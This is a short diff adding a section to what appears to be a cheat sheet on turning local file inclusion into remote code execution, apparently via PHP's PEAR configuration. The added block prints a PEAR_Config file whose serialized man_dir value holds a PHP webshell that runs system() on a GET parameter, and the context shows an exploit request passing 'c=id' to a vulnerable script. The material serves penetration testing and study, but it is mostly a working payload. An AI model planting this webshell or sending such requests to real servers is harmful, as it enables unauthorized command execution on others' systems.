@@ -520,6 +520,13 @@ There are two ways to exploit it.
   /vuln.php?file=/tmp/exec.php&c=id
   ```
 
+The created configuration file contains the webshell.
+
+```php
+#PEAR_Config 0.9
+a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
+```
+
 
 ## LFI to RCE via credentials files
 
